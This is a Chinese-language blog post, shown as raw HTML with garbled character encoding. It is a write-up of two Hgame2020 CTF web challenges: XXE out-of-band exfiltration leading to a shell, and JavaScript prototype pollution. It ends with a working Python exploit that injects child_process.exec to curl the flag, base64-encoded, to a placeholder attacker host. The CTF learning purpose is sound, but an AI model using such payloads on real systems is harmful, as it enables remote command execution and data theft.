<!DOCTYPE html>
<html lang="zh">
  <head>
    
<meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,minimum-scale=1,maximum-scale=1">


<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />



  <meta name="description" content="Hgame2020-Week4-éƒ¨åˆ†WebWP"/>




  <meta name="keywords" content="Else," />





  <link rel="alternate" href="/default" title="RuoWeber">




  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.1" />



<link rel="canonical" href="http://yoursite.com/2020/02/14/Hgame2020Week4Web(Php&Js)/"/>


<meta name="description" content="å‰è¨€å¯’å‡åœ¨å®¶åšäº†ä¸‹ä»Šå¹´çš„hgame,ä¸ç®¡è¯´æ˜¯å•ä»wee4æˆ–è€…ç»¼åˆæ¥çœ‹å¥½åƒæ¯”å»å¹´çš„ç®€å•ä¸å°‘ã€‚ã€‚ã€‚(ä½†æ˜¯ä¾ç„¶è§‰å¾—å¾ˆéš¾orz)ã€‚è¿™é‡Œé—²æ¥æ— äº‹å…ˆè®°å½•ä¸‹week4Webçš„phpå’Œjsçš„ä¸¤é“é¢˜">
<meta name="keywords" content="Else">
<meta property="og:type" content="article">
<meta property="og:title" content="Hgame2020-Week4-éƒ¨åˆ†WebWP">
<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;14&#x2F;Hgame2020Week4Web(Php&amp;Js)&#x2F;index.html">
<meta property="og:site_name" content="RuoWeber">
<meta property="og:description" content="å‰è¨€å¯’å‡åœ¨å®¶åšäº†ä¸‹ä»Šå¹´çš„hgame,ä¸ç®¡è¯´æ˜¯å•ä»wee4æˆ–è€…ç»¼åˆæ¥çœ‹å¥½åƒæ¯”å»å¹´çš„ç®€å•ä¸å°‘ã€‚ã€‚ã€‚(ä½†æ˜¯ä¾ç„¶è§‰å¾—å¾ˆéš¾orz)ã€‚è¿™é‡Œé—²æ¥æ— äº‹å…ˆè®°å½•ä¸‹week4Webçš„phpå’Œjsçš„ä¸¤é“é¢˜">
<meta property="og:locale" content="zh">
<meta property="og:image" content="https:&#x2F;&#x2F;user-images.githubusercontent.com&#x2F;34148939&#x2F;74526727-effbd400-4f5e-11ea-9b70-e31814c6afb3.png">
<meta property="og:image" content="https:&#x2F;&#x2F;user-images.githubusercontent.com&#x2F;34148939&#x2F;74526813-26d1ea00-4f5f-11ea-90b9-d44bf7400b8a.png">
<meta property="og:image" content="https:&#x2F;&#x2F;user-images.githubusercontent.com&#x2F;34148939&#x2F;74527465-b6c46380-4f60-11ea-9658-6a98769ac36b.png">
<meta property="og:image" content="https:&#x2F;&#x2F;user-images.githubusercontent.com&#x2F;34148939&#x2F;74527799-92b55200-4f61-11ea-9c06-b673d0518825.png">
<meta property="og:image" content="https:&#x2F;&#x2F;user-images.githubusercontent.com&#x2F;34148939&#x2F;74528022-24bd5a80-4f62-11ea-836d-da88b0360496.png">
<meta property="og:image" content="https:&#x2F;&#x2F;user-images.githubusercontent.com&#x2F;34148939&#x2F;74528161-7c5bc600-4f62-11ea-86c8-17fc0825dbd2.png">
<meta property="og:updated_time" content="2020-03-05T07:59:41.747Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https:&#x2F;&#x2F;user-images.githubusercontent.com&#x2F;34148939&#x2F;74526727-effbd400-4f5e-11ea-9b70-e31814c6afb3.png">


<link rel="stylesheet" type="text/css" href="/css/style.css?v=1.1" />
<link href='https://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet'>





<script type="text/javascript">
  var themeConfig = {
    fancybox: {
      enable: false
    },
  };
</script>




  



    <title> Hgame2020-Week4-éƒ¨åˆ†WebWP - RuoWeber </title>
  </head>

  <body>
    <div id="page">
      <header id="masthead"><div class="site-header-inner">
    <h1 class="site-title">
        <a href="/." class="logo">RuoWeber</a>
    </h1>

    <nav id="nav-top">
        
            <ul id="menu-top" class="nav-top-items">
                
                    <li class="menu-item">
                        <a href="/archives">
                            
                            
                                Archives
                            
                        </a>
                    </li>
                
                    <li class="menu-item">
                        <a href="/about">
                            
                            
                                About
                            
                        </a>
                    </li>
                
            </ul>
        
  </nav>
</div>

      </header>
      <div id="content">
        
    <div id="primary">
        
  <article class="post">
    <header class="post-header">
      <h1 class="post-title">
        
          Hgame2020-Week4-éƒ¨åˆ†WebWP
        
      </h1>

      <time class="post-time">
          Feb 14 2020
      </time>
    </header>



    
            <div class="post-content">
            <h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>å¯’å‡åœ¨å®¶åšäº†ä¸‹ä»Šå¹´çš„hgame,ä¸ç®¡è¯´æ˜¯å•ä»wee4æˆ–è€…ç»¼åˆæ¥çœ‹å¥½åƒæ¯”å»å¹´çš„ç®€å•ä¸å°‘ã€‚ã€‚ã€‚(ä½†æ˜¯ä¾ç„¶è§‰å¾—å¾ˆéš¾orz)ã€‚è¿™é‡Œé—²æ¥æ— äº‹å…ˆè®°å½•ä¸‹week4Webçš„phpå’Œjsçš„ä¸¤é“é¢˜</p>
<a id="more"></a>

<h4 id="PHP-xxeç›²æ³¨å¥—å¨ƒhitconçš„babyfirst-revenge"><a href="#PHP-xxeç›²æ³¨å¥—å¨ƒhitconçš„babyfirst-revenge" class="headerlink" title="PHP(xxeç›²æ³¨å¥—å¨ƒhitconçš„babyfirst-revenge)"></a>PHP(xxeç›²æ³¨å¥—å¨ƒhitconçš„babyfirst-revenge)</h4><p>æŠ“åŒ…ä¸€çœ‹ï¼Œè‚¯å®šç¬¬ä¸€æƒ³æ³•æ˜¯xxeæ‰“ä¸€æ¢­å­ï¼Œå‘ç°å›æ˜¾æœ‰ç‚¹å¥‡æ€ªçœ‹ä¸æ‡‚ã€‚ã€‚ã€‚ç„¶åå°±æƒ³åˆ°äº†xxeæ•°æ®å¤–å¸¦ï¼Œä»ç½‘ä¸Šæ‰¾ä¸ªexpæ¥è¯•ä¸‹ï¼Œ</p>
<p><img src="https://user-images.githubusercontent.com/34148939/74526727-effbd400-4f5e-11ea-9b70-e31814c6afb3.png" alt="">,z.dtdå†…å®¹ä¸ºï¼š</p>
<p><img src="https://user-images.githubusercontent.com/34148939/74526813-26d1ea00-4f5f-11ea-90b9-d44bf7400b8a.png" alt=""></p>
<p>è¯»å–/flagæ— æœåï¼Œå‘ç°/etc/hostsæœ‰ä¸ªå†…ç½‘ä¸»æœºï¼Œè®¿é—®ä¸‹å‘ç°éœ€è¦å¸¦ä¸Šé˜Ÿä¼tokenè®¿é—®(<code>è¿™é‡Œæœ‰ä¸€ç‚¹ï¼Œå°±æ˜¯dtdä¸­ç”¨php://filterè¯»å–æ—¶éœ€è¦ä½¿ç”¨zlib.deflateå‹ç¼©ä¸‹ï¼Œè¦ä¸è¿”å›çš„æ•°æ®å¤ªå¤šä¼šæŠ¥é”™ã€‚ã€‚ã€‚</code>),å¸¦ä¸Štokenåè®¿é—®å¾—åˆ°çš„æ•°æ®è§£å‹å(php://filter/read=convert.base64-encode/zlib.inflate//resource=xxx)å†™æˆhtmlçœ‹ä¸€ä¸‹,</p>
<p>å‘ç°æ˜¯hitconçš„babyfirst-revengeçš„åŸé¢˜(æ²¡æˆªå›¾äº†ã€‚ã€‚)</p>
<p>ç„¶åå†™ä¸ªè„šæœ¬å»getshell(ç½‘ä¸Šéƒ½æœ‰ï¼Œå°±ä¸å±•ç¤ºè‡ªå·±çš„ğŸ’©ä»£ç äº†)ï¼Œ</p>
<p><img src="https://user-images.githubusercontent.com/34148939/74527465-b6c46380-4f60-11ea-9658-6a98769ac36b.png" alt=""></p>
<p>ç„¶åå‘ç°ä¸€ç›´æ²¡æ‰¾åˆ°flagï¼Œæœ€åå†/etcä¸‹é¢æ‰¾åˆ°ã€‚ã€‚ä¸çŸ¥é“è¿™é‡Œå‡ºé¢˜äººè¦è€ƒä»€ä¹ˆã€‚ã€‚ã€‚ç¡¬ç¿»åˆ°çš„ã€‚</p>
<h4 id="sekiro-jsåŸå‹é“¾æ±¡æŸ“"><a href="#sekiro-jsåŸå‹é“¾æ±¡æŸ“" class="headerlink" title="sekiro(jsåŸå‹é“¾æ±¡æŸ“)"></a>sekiro(jsåŸå‹é“¾æ±¡æŸ“)</h4><p>ç¬¬ä¸€æ¬¡åšåŸå‹é“¾æ±¡æŸ“çš„é¢˜ã€‚ã€‚ã€‚åŸå‹é“¾æ±¡æŸ“çš„åŸç†ç½‘ä¸Šå¾ˆå¤šã€‚æŒ‰ç…§æˆ‘çš„ç†è§£å°±æ˜¯<code>åŸå‹é“¾æ±¡æŸ“çš„å±å®³å°±æ˜¯å¯ä»¥åˆ©ç”¨ä¸€äº›èµ‹å€¼æ“ä½œæ¶æ„åœ°ç»™æŸä¸ªå¯¹è±¡èµ‹äºˆä¸€ä¸ªæ¶æ„çš„å±æ€§</code>ï¼Œè¿™é‡Œæ¼æ´å…¶å®å¾ˆæ˜æ˜¾çš„ï¼Œå®¡è®¡æºç å‘ç°å†/actionè·¯ç”±ä¸‹é¢</p>
<p><img src="https://user-images.githubusercontent.com/34148939/74527799-92b55200-4f61-11ea-9c06-b673d0518825.png" alt=""></p>
<p><img src="https://user-images.githubusercontent.com/34148939/74528022-24bd5a80-4f62-11ea-836d-da88b0360496.png" alt=""></p>
<p>è¿™é‡Œæœ‰äº†åŸå‹é“¾æ±¡æŸ“çš„ç‚¹ï¼Œä½†æ˜¯æ€ä¹ˆåˆ©ç”¨è¿™ä¸ªç‚¹å»getflagæˆ–è€…å‘½ä»¤æ‰§è¡Œåˆ°ç›®å‰è¿˜ä¸æ˜æ˜¾ï¼Œç»§ç»­å¾€ä¸‹çœ‹ï¼Œè·Ÿè¿›dealwithattacksçš„å®ç°ï¼Œ</p>
<p><img src="https://user-images.githubusercontent.com/34148939/74528161-7c5bc600-4f62-11ea-86c8-17fc0825dbd2.png" alt=""></p>
<p>è¿™é‡Œå‘ç°æœ‰ä¸ªå‡½æ•°æ‰§è¡Œè¯­å¥ç›´æ¥æ‹¼æ¥äº†å˜é‡ï¼Œæˆ‘ä»¬å†çœ‹ä¸‹attacksçš„æ•°ç»„ï¼Œå‘ç°æœ‰çš„é”®å€¼æ˜¯æ²¡æœ‰additionalEffectå±æ€§çš„ï¼Œè¿™é‡Œå°±å¾ˆæ˜æ˜¾äº†ï¼Œæˆ‘ä»¬é€šè¿‡åŸå‹é“¾æ±¡æŸ“ï¼Œç»™objectèµ‹å€¼ä¸€ä¸ªæ¶æ„çš„additionalEffectçš„å€¼ï¼Œsekiro.attackInfoæ²¡æœ‰è¿™ä¸ªå±æ€§çš„è¯å°±ä¼šéµå¾ªåŸå‹é“¾åˆ°objectï¼Œç»§æ‰¿objectçš„additionalEffectçš„å€¼ï¼Œä»è€Œå®ç°å¯æ§çš„å‘½ä»¤æ‰§è¡Œã€‚</p>
<p>è„šæœ¬å¦‚ä¸‹:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">baseurl = <span class="string">'http://sekiro.hgame.babelfish.ink/'</span> </span><br><span class="line">header = &#123;</span><br><span class="line">    <span class="string">'content-type'</span>: <span class="string">'application/json'</span></span><br><span class="line">&#125;</span><br><span class="line">data = &#123;<span class="string">'solution'</span>:<span class="string">'123'</span>,<span class="string">'__proto__'</span>:&#123;<span class="string">"additionalEffect"</span>:<span class="string">"process.mainModule.require('child_process').exec('curl http://ip:port/`cat /flagï½œbase64` 0&gt;&amp;1')"</span>&#125;&#125;</span><br><span class="line">se = requests.Session()</span><br><span class="line"><span class="comment">#get /</span></span><br><span class="line">re = se.get(baseurl)</span><br><span class="line"><span class="comment">#get /info</span></span><br><span class="line">re = se.get(baseurl+<span class="string">'info'</span>)</span><br><span class="line"><span class="comment">#get /attack</span></span><br><span class="line">re = se.get(baseurl+<span class="string">'attack'</span>)</span><br><span class="line"><span class="comment">#post /action</span></span><br><span class="line">re = se.post(baseurl+<span class="string">'action'</span>,headers=header,data=json.dumps(data)).text</span><br><span class="line">print(re)</span><br></pre></td></tr></table></figure>


            </div>
          

    
      <footer class="post-footer">
		
		<div class="post-tags">
		  
			<a href="/tags/Else/">Else</a>
		  
		</div>
		

        
        
  <nav class="post-nav">
    
      <a class="prev" href="/2020/02/20/ThinkPhp%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/">
        <i class="iconfont icon-left"></i>
        <span class="prev-text nav-default">ThinkPhpå­¦ä¹ </span>
        <span class="prev-text nav-mobile">Prev</span>
      </a>
    
    
      <a class="next" href="/2020/01/29/Bytectf-BabyblogWP/">
        <span class="next-text nav-default">Bytectf-BabyblogWP</span>
        <span class="prev-text nav-mobile">Next</span>
        <i class="iconfont icon-right"></i>
      </a>
    
  </nav>

        
  <div class="comments" id="comments">
    
  </div>


      </footer>
    
  </article>

    </div>

      </div>

      <footer id="colophon"><span class="copyright-year">
    
        &copy;
    
        2014 -
    
    2020
    <span class="footer-author">asy.</span>
    <span class="power-by">
        Powered by <a class="hexo-link" href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> and <a class="theme-link" href="https://github.com/frostfan/hexo-theme-polarbear" target="_blank" rel="noopener">Polar Bear</a>
    </span>
</span>

      </footer>

      <div class="back-to-top" id="back-to-top">
        <i class="iconfont icon-up"></i>
      </div>
    </div>
    


    




  
    <script type="text/javascript" src="/lib/jquery/jquery-3.1.1.min.js"></script>
  

  

    <script type="text/javascript" src="/js/src/theme.js?v=1.1"></script>
<script type="text/javascript" src="/js/src/bootstrap.js?v=1.1"></script>

  </body>
</html>
